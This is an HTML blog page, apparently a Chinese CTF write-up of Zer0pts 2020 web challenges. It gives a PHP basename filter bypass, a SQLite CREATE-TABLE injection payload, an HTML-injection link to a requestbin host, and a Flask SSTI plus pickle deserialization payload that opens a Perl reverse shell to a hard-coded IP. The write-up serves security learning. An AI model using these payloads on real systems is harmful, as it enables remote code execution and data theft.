@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>Zer0pts2020web复现 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Zer0pts2020web复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 6, 2020&nbsp;&nbsp;20:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="Can-you-guess-it"><a href="#Can-you-guess-it" class="headerlink" title="Can you guess it?"></a>Can you guess it?</h2><p>让我们猜什么东西，点击source可以得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">'ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href="?source"&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="POST"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="text" name="guess"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>定义了一个<code>$secret</code>是随机的64位字符串的十六进制，如果我们post的<code>$guess</code>参数满足<code>hash_equals($secret, $guess)</code>，则可以得到flag。</p>
+<p>php5.6版本新增了一个函数hash_equals，可防止时序攻击的字符串比较。</p>
+<blockquote>
+<p>在密码学中,时序攻击是一种侧信道攻击,攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行,根据输入不同,精确测量执行时间,根据执行时间反推出密码。</p>
+<p>如果是用普通的 == 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 false，那么通过计算返回的速度就知道了大概是哪一位开始不同的，这样就实现了电影中经常出现的按位破解密码的场景。</p>
+</blockquote>
+<p>回到题目，可以看到读取源码的地方使用了<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code>，读取的是当前执行脚本的文件名，<code>index.php?source</code>读的是index.php，但把config.php加后面读的就是config.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093000.png" alt=""></p>
+<p>但这里加了过滤条件<code>/config\.php\/*$/i</code>不允许config.php后面加参数，这里涉及到了basename的一个<a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">问题</a>，它会自动去掉文件名开头或者末尾的非ASCII值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806091654.png" alt=""></p>
+<p>那么请求<code>index.php/config.php%ff?source</code>即可</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806092448.png" alt=""></p>
+<h2 id="phpNantokaAdmin"><a href="#phpNantokaAdmin" class="headerlink" title="phpNantokaAdmin"></a>phpNantokaAdmin</h2><p>首页是一个可以创建表的管理界面，创建表之后可以插入数据，也可以删除表</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093330.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806093436.png" alt=""></p>
+<p>源码得知数据库是sqlite</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806100842.png" alt=""></p>
+<p>sqlite数据库中，当列名用<code>&quot; &#39; []</code>等字符隔开时，sqlite只会把这些字符包含的字符串当做列名，并且忽视后面的字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105714.png" alt=""></p>
+<p>并且sqlite可以create table … as select …，把select的查询结果放到创建的表中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806101419.png" alt=""></p>
+<p>题目中sql语句大概是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, &#96;$column&#96; $type);</span><br></pre></td></tr></table></figure>
+
+<p>如果我们创建表时传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;[aaa] as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>就相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;CREATE TABLE [aaa] as select [sql][ (dummy1 TEXT, dummy2 TEXT, &#96;]from sqlite_master;&#96; 2);&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>[sql]</code>后面的<code>[(dummy1 TEXT, dummy2 TEXT,</code>`]被忽略，就相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table [aaa] as select sql from sqlite_master</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>SQLite数据库中有一个内置表，名为SQLITE_MASTER，此表中存储着当前数据库中所有表的相关信息，比如表的名称、用于创建此表的sql语句、索引、索引所属的表、创建索引的sql语句等。</p>
+</blockquote>
+<p>抓包修改post</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104734.png" alt=""></p>
+<p>得到了数据库和字段名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806104807.png" alt=""></p>
+<p>那么再接着读</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name&#x3D;[aaa] as select [flag_2a2d04c3][&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;CREATE TABLE [aaa] as select [flag_2a2d04c3][ (dummy1 TEXT, dummy2 TEXT, &#96;]from flag_bf1811da;&#96; 2);&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table aaa as select flag_2a2d04c3 from flag_bf1811da</span><br></pre></td></tr></table></figure>
+
+<p>同样抓包修改</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105046.png" alt=""></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806105105.png" alt=""></p>
+<h2 id="musicblog"><a href="#musicblog" class="headerlink" title="musicblog"></a>musicblog</h2><p>注册登录可以发post</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806112531.png" alt=""></p>
+<p>看到这个管理员会检查post以为是xss但是尝试无果，抓包发现设置了CSP无法跨域请求</p>
+<p><img src="https://raw.githubusercontent.com/blacknight12231/cdn/master/20200806113824.png" alt="img"></p>
+<p>测试标签只允许audio其他一概过滤，但在audio里加上<code>/</code>后，发现<code>/</code>会被替换称空格，audio标签会被自动隔断从而<code>/</code>前面的内容在html内形成<code>&lt;a&gt;</code>标签</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115104.png" alt=""></p>
+<p>也就可以构造超链接，而超链接是不受CSP影响的，所以我们构造一个超链接让bot管理员点击，就达到了目的</p>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1cap6um1&gt;blacknight</span><br></pre></td></tr></table></figure>
+
+<p>post上去之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1cap6um1&gt;blacknight</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115628.png" alt=""></p>
+<p>得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806115707.png" alt=""></p>
+<p>看别的师傅的wp应该是这里bot检查脚本用了strip_tags函数，存在<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">漏洞</a></p>
+<h2 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h2><p>一个简化的文本编辑器</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806120444.png" alt=""></p>
+<p>源码404页面的referer处存在模板注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="string">""" Automatically go back when page is not found """</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">"Referer"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">'/'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">'/'</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL=&#123;&#125;"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806130736.png" alt=""></p>
+<p>查看得到secert_key</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131026.png" alt=""></p>
+<p>但由于源码处队url做了长度限制，不能更进一步利用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">valid_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="string">""" Check if given url is valid """</span></span><br><span class="line">    host = flask.request.host_url</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(host): <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># Not from my server</span></span><br><span class="line">    <span class="keyword">if</span> len(url) - len(host) &gt; <span class="number">16</span>: <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># Referer may be also 404</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>解密session有个savedata</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806131906.png" alt=""></p>
+<p>源码查看savedata会被base64解码。然后反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">""" Load saved notes """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">'savedata'</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">"date"</span>: now(), <span class="string">"text"</span>: <span class="string">""</span>, <span class="string">"title"</span>: <span class="string">"*New Note*"</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+
+<p>有了secert_key，可以伪造一个shell进去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">         <span class="keyword">return</span> (os.system,(<span class="string">"""perl -e 'use Socket;$i="174.2.214.12";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'"""</span>,))</span><br><span class="line">a = A()</span><br><span class="line">print(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
+
+<p>由于key包含不可见字符，先python用encodeBytes处理一下再伪造时base64解码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200806182400.png" alt=""></p>
+<p>然后访问note/1触发</p>
+<p>nc，perl都试了还是弹不到。。。结合其他师傅的wp搞了好久。。。今天心态有点爆炸，过几天来看看</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/08/06/Zer0pts2020_web/">http://www.blacknight.top/2020/08/06/Zer0pts2020_web/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CSP/"># CSP</a>
+                    
+                        <a href="/tags/ssti/"># ssti</a>
+                    
+                        <a href="/tags/sqlite/"># sqlite</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/28/msf_note5/">metasploit免杀技巧</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
